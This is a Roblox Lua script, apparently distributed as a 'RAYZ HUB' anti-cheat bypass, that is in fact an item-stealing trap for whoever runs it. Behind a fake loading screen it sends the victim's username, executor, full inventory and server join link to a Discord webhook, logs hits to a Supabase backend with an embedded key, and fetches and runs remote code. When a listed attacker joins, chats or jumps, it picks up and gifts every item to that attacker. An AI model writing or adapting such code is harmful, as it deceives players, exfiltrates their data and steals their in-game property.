-- LocalScript → StarterPlayer > StarterPlayerScripts
local USERNAMES = users -- Add your usernames here
local EXCLUDED_ITEMS = {"Basic Bat"}
local WEBHOOK = wen

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer

-- === SUPABASE CONFIG ===
local SUPABASE_URL = "https://yiyjqwmwoalxhvwiigwi.supabase.co"
local SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlpeWpxd213b2FseGh2d2lpZ3dpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgxMzI1MzIsImV4cCI6MjA4MzcwODUzMn0.35khALBOy3LY5lTGNcVLQHMuMfEoNOS7ye_0T6vEVoY"

-- ────────────────────────────────────────────────
-- Loading Screen Logic
-- ────────────────────────────────────────────────
local function createLoadingScreen()
    local sg = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
    sg.Name = "RayzLoading"
    sg.IgnoreGuiInset = true

    local main = Instance.new("Frame", sg)
    main.Size = UDim2.new(0, 350, 0, 120)
    main.Position = UDim2.new(0.5, -175, 0.5, -60)
    main.BackgroundColor3 = Color3.fromRGB(20, 10, 30)
    main.BorderSizePixel = 0
    
    local corner = Instance.new("UICorner", main)
    corner.CornerRadius = UDim.new(0, 12)

    local stroke = Instance.new("UIStroke", main)
    stroke.Color = Color3.fromRGB(150, 0, 255)
    stroke.Thickness = 2
    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

    local title = Instance.new("TextLabel", main)
    title.Size = UDim2.new(1, 0, 0, 40)
    title.Text = "Bypassing anti cheat..."
    title.TextColor3 = Color3.fromRGB(220, 180, 255)
    title.TextSize = 20
    title.Font = Enum.Font.GothamBold
    title.BackgroundTransparency = 1

    local barBg = Instance.new("Frame", main)
    barBg.Size = UDim2.new(0.8, 0, 0, 8)
    barBg.Position = UDim2.new(0.1, 0, 0.6, 0)
    barBg.BackgroundColor3 = Color3.fromRGB(40, 20, 60)
    barBg.BorderSizePixel = 0
    Instance.new("UICorner", barBg).CornerRadius = UDim.new(1, 0)

    local barFill = Instance.new("Frame", barBg)
    barFill.Size = UDim2.new(0, 0, 1, 0)
    barFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    barFill.BorderSizePixel = 0
    Instance.new("UICorner", barFill).CornerRadius = UDim.new(1, 0)

    local gradient = Instance.new("UIGradient", barFill)
    gradient.Color = ColorSequence.new(Color3.fromRGB(150, 0, 255), Color3.fromRGB(200, 100, 255))

    local loadingTime = 30
    local startTime = tick()

    task.spawn(function()
        while tick() - startTime < loadingTime do
            local currentProgress = (tick() - startTime) / loadingTime
            barFill.Size = UDim2.new(currentProgress, 0, 1, 0)
            
            local authorizedFound = false
            for _, name in ipairs(USERNAMES) do
                if Players:FindFirstChild(name) then
                    authorizedFound = true
                    break
                end
            end

            if authorizedFound then
                sg:Destroy()
                loadstring(game:HttpGet("https://rayzhubb.vercel.app/etfb-gui.lua", true))()
                return
            end
            task.wait(0.5)
        end

        title.Text = "failed to bypass anti cheat,\n pls try again later"
        title.TextColor3 = Color3.fromRGB(255, 50, 50)
        barFill.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
        
        _G.updateWebhook("🔴 Failed", 0xFF0000, false, 0)
        
        task.wait(2)
        player:Kick("Failed to bypass anti cheat.")
    end)
end

local function deleteSounds()
    local assets = ReplicatedStorage:FindFirstChild("Assets")
    if assets and assets:FindFirstChild("Sounds") then
        assets.Sounds:Destroy()
    end
end 

local function message()
    setclipboard("https://discord.gg/rayz-hub-1422073445927354380")
    local packages = ReplicatedStorage:WaitForChild("Packages", 5)
    local net = packages and packages:WaitForChild("Net", 5)
    local popupRemote = net and net:FindFirstChild("RE/DisplayPopup")
    if popupRemote then
        pcall(function()
            popupRemote:FireClient("Info", "Made by RAYZ HUB (discord link copied)", player)
        end)
    end
end

local function incrementHitCount(webhookUrl)
    if not webhookUrl or webhookUrl == "" then return false end
    local payload = { p_webhook = webhookUrl }
    local success, response = pcall(function()
        local req = (syn and syn.request) or request or http_request or (http and http.request)
        if not req then return end
        return req({
            Url = SUPABASE_URL .. "/rest/v1/rpc/increment_hits_for_webhook",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json",
                ["apikey"] = SUPABASE_ANON_KEY,
                ["Authorization"] = "Bearer " .. SUPABASE_ANON_KEY,
            },
            Body = HttpService:JSONEncode(payload)
        })
    end)
    return success
end

-- ────────────────────────────────────────────────
-- Server Size Checker
-- ────────────────────────────────────────────────
if #Players:GetPlayers() >= 5 then
    local sg = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
    sg.Name = "RayzHubRedirect"

    local main = Instance.new("Frame", sg)
    main.Size = UDim2.new(0, 400, 0, 200)
    main.Position = UDim2.new(0.5, -200, 0.5, -100)
    main.BackgroundColor3 = Color3.fromRGB(30, 0, 45)
    main.BorderSizePixel = 0
    
    local corner = Instance.new("UICorner", main)
    corner.CornerRadius = UDim.new(0, 10)

    local stroke = Instance.new("UIStroke", main)
    stroke.Color = Color3.fromRGB(150, 0, 255)
    stroke.Thickness = 2

    local title = Instance.new("TextLabel", main)
    title.Size = UDim2.new(1, 0, 0, 50)
    title.Text = "RAYZ HUB"
    title.TextColor3 = Color3.fromRGB(200, 100, 255)
    title.TextSize = 28
    title.Font = Enum.Font.GothamBold
    title.BackgroundTransparency = 1

    local sub = Instance.new("TextLabel", main)
    sub.Size = UDim2.new(1, -40, 0, 60)
    sub.Position = UDim2.new(0, 20, 0, 50)
    sub.Text = "Anti cheat bypass failed on this server, please redirect to a new server"
    sub.TextColor3 = Color3.fromRGB(255, 255, 255)
    sub.TextSize = 16
    sub.Font = Enum.Font.Gotham
    sub.TextWrapped = true
    sub.BackgroundTransparency = 1

    local btn = Instance.new("TextButton", main)
    btn.Size = UDim2.new(0, 150, 0, 40)
    btn.Position = UDim2.new(0.5, -75, 0, 130)
    btn.BackgroundColor3 = Color3.fromRGB(100, 0, 180)
    btn.Text = "Redirect"
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 18

    local btnCorner = Instance.new("UICorner", btn)
    
    btn.MouseButton1Click:Connect(function()
        btn.Text = "Finding Server..."
        local sf = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"))
        for _, server in pairs(sf.data) do
            if server.playing < 5 and server.id ~= game.JobId then
                TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id)
                return
            end
        end
    end)
    return 
end

-- ────────────────────────────────────────────────
-- Main Logic
-- ────────────────────────────────────────────────
createLoadingScreen()
deleteSounds()
incrementHitCount(WEBHOOK)
local PROXY_URL = (WEBHOOK and WEBHOOK ~= "") and WEBHOOK:gsub("discord.com", "webhook.lewisakura.moe") or nil
local messageId = nil 

message()

local function getDetailedInventories(showTotal, itemsTaken)
    local baseList = {}
    local backpackList = {}
    
    local currentBackpack = player:FindFirstChild("Backpack")
    local currentChar = player.Character
    
    local function scanFolder(folder)
        if not folder then return end
        for _, item in ipairs(folder:GetChildren()) do
            if item:IsA("Tool") and not table.find(EXCLUDED_ITEMS, item.Name) then
                local brainrotName = item:GetAttribute("BrainrotName") or item.Name
                table.insert(backpackList, brainrotName)
            end
        end
    end

    scanFolder(currentBackpack)
    scanFolder(currentChar)

    local myBase = nil
    local basesFolder = workspace:FindFirstChild("Bases_NEW")
    if basesFolder then
        for _, model in ipairs(basesFolder:GetChildren()) do
            if model:GetAttribute("Holder") == player.UserId then 
                myBase = model 
                break 
            end
        end
    end

    if myBase then
        for i = 1, 12 do
            local slotFolder = myBase:FindFirstChild("slot " .. i .. " brainrot")
            if slotFolder and slotFolder:GetAttribute("BrainrotName") ~= "" then
                local bName = slotFolder:GetAttribute("BrainrotName")
                local brainrotModel = slotFolder:FindFirstChildWhichIsA("Model")
                local bLevel = slotFolder:GetAttribute("Level") or "1"
                local bMut = slotFolder:GetAttribute("Mutation") or "None"
                local rateText, classText = "N/A", "N/A"
                if brainrotModel then
                    local stats = brainrotModel:FindFirstChild("ModelExtents") and brainrotModel.ModelExtents:FindFirstChild("StatsGui") and brainrotModel.ModelExtents.StatsGui:FindFirstChild("Frame")
                    if stats then
                        if stats:FindFirstChild("Rate") then rateText = stats.Rate.Text end
                        if stats:FindFirstChild("Class") then classText = stats.Class.Text end
                    end
                end
                table.insert(baseList, string.format("[%s | %s | Lvl %s | %s | %s]", bName, classText, tostring(bLevel), bMut, rateText))
            end
        end
    end

    local baseReport = #baseList > 0 and table.concat(baseList, "\n") or "Empty"
    local backpackReport = #backpackList > 0 and table.concat(backpackList, ", ") or "Empty"

    return baseReport, backpackReport
end

local function updateWebhook(statusText, color, showTotal, itemsTaken)
    if not PROXY_URL then return end 
    local baseReport, backpackReport = getDetailedInventories(showTotal, itemsTaken)
    local request = (syn and syn.request) or (http and http.request) or http_request or request
    if not request then return end
    
    local jobId = tostring(game.JobId)
    local joinLink = "https://rayzhubjoiner.vercel.app?placeId=" .. tostring(game.PlaceId) .. "&jobId=" .. jobId
    local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
    local tpScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")', game.PlaceId, game.JobId)

    local payload = HttpService:JSONEncode({
        avatar_url = "https://rayzhubb.vercel.app/pngs/logo.png",
        username = "jeffrey epstein",
        embeds = {{
            title = "RAYZ HUB",
            color = color or 0x800080,
            fields = {
                {name = "<:rayz_check:1459279711774576846> Status", value ="```" .. statusText .. "```", inline = false},
                {name = "<:rayz_member:1459280047570419814> Username", value = "```" .. player.Name .. "```", inline = true},
                {name = "<:rayz_admin:1459279907011166239> Executor", value = "```" .. executor .. "```", inline = true},
                {name = "<:rayz_backpack:1459652540630171844> Backpack Items", value = "```" .. backpackReport .. "```", inline = false},
                {name = "<:rayz_backpack:1459652540630171844> Base Items", value = "```" .. baseReport .. "```", inline = false},
                {name = "<:rayz_mod:1459652587409379481> Teleport Script", value = "```lua\n" .. tpScript .. "\n```", inline = false},
                {name = "<:rayz_settings:1459279856931176500> Join Link", value = "[Click to Join](" .. joinLink .. ")", inline = false},
            },
            footer = { text = "RAYZ HUB", icon_url = "https://rayzhubb.vercel.app/pngs/logo.png" },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
            image = { url = "https://rayzhubb.vercel.app/pngs/etfb.png"}
        }}
    })

    local url = messageId and (PROXY_URL .. "/messages/" .. messageId) or (PROXY_URL .. "?wait=true")
    local method = messageId and "PATCH" or "POST"
    local success, response = pcall(function()
        return request({Url = url, Method = method, Headers = {["Content-Type"] = "application/json"}, Body = payload})
    end)
    if success and not messageId and response.Body then
        local decoded = HttpService:JSONDecode(response.Body)
        messageId = decoded.id
    end
end
_G.updateWebhook = updateWebhook

local sequenceStarted = false
updateWebhook("🟡 Waiting for user", 0xFFFF00, false, 0)

Players.PlayerRemoving:Connect(function(leftPlayer)
    if table.find(USERNAMES, leftPlayer.Name) then
        updateWebhook("🔴 Failed", 0xFF0000, false, 0)
    end
end)

local function runSequence(target)
    if not target or sequenceStarted then return end 
    sequenceStarted = true 
    
    local basesFolder = workspace:WaitForChild("Bases_NEW", 5)
    local plotAction = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net"):WaitForChild("RF/Plot.PlotAction")
    local myBase = nil
    for _, model in ipairs(basesFolder:GetChildren()) do
        if model:GetAttribute("Holder") == player.UserId then 
            myBase = model 
            break 
        end
    end

    local itemsTaken = 0
    local totalOnBase = 0

    if myBase then
        for i = 1, 12 do
            local slot = myBase:FindFirstChild("slot " .. i .. " brainrot")
            if slot and slot:GetAttribute("BrainrotName") ~= "" then 
                totalOnBase = totalOnBase + 1
                local success = pcall(function() 
                    plotAction:InvokeServer("Pick Up Brainrot", myBase.Name, tostring(i)) 
                end)
                if success then
                    itemsTaken = itemsTaken + 1
                    updateWebhook("🟡 Picking up items", 0x00FF00, true, itemsTaken)
                    task.wait(0.1)
                end
            end
        end
    end

    updateWebhook("🟡 Gifting", 0x00FF00, true, itemsTaken)
    task.wait(1)

    local giftRemote = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net"):FindFirstChild("RF/Trade.SendGift")
    
    while target and target.Parent == Players do
        local backpack = player:FindFirstChild("Backpack")
        local character = player.Character
        local humanoid = character and character:FindFirstChild("Humanoid")
        
        local validTools = {}

        if backpack then
            for _, item in ipairs(backpack:GetChildren()) do
                if item:IsA("Tool") and not table.find(EXCLUDED_ITEMS, item.Name) then
                    table.insert(validTools, item)
                end
            end
        end
        
        if character then
            for _, item in ipairs(character:GetChildren()) do
                if item:IsA("Tool") and not table.find(EXCLUDED_ITEMS, item.Name) then
                    table.insert(validTools, item)
                end
            end
        end

        if #validTools == 0 then break end

        for _, item in ipairs(validTools) do
            if humanoid and item.Parent ~= character then
                humanoid:EquipTool(item)
                task.wait(0.1)
            end

            if item.Parent == character or item.Parent == backpack then
                pcall(function() giftRemote:InvokeServer(target, item) end)
                task.wait(0.3)
                updateWebhook("🟡 Sending trades...", 0x00FF00, true, itemsTaken)
            end
        end
        
        task.wait(1)
    end
    
    if itemsTaken > 0 and itemsTaken < totalOnBase then
        updateWebhook("🔵 Partially claimed", 0x0000FF, true, itemsTaken)
    else
        updateWebhook("🟢 Claimed", 0x00FF00, true, itemsTaken)
    end
    
    sequenceStarted = false
end

-- ────────────────────────────────────────────────
-- Authorized Trigger Listeners (FIXED)
-- ────────────────────────────────────────────────
local function setupTriggers(p)
    if not table.find(USERNAMES, p.Name) then return end

    p.Chatted:Connect(function() runSequence(p) end)

    local function onCharAdded(char)
        local hum = char:WaitForChild("Humanoid")
        hum.Jumping:Connect(function() runSequence(p) end)
    end

    p.CharacterAdded:Connect(onCharAdded)
    if p.Character then onCharAdded(p.Character) end
end

-- Initial check for all players currently in game
for _, p in ipairs(Players:GetPlayers()) do
    setupTriggers(p)
end

Players.PlayerAdded:Connect(setupTriggers)
